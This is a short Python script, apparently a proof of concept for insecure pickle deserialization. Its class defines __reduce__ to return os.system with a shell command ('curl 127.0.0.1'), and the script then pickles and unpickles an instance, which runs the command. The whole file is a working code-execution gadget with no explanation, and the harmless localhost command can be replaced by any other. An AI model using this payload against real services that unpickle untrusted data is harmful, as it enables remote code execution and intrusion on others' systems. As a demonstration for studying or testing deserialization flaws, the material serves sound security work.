import pickle
import os


class PickleKlass(object):

    def __reduce__(self):
        return os.system, ('curl 127.0.0.1',)


raw = pickle.dumps(PickleKlass())
pickle.loads(raw)
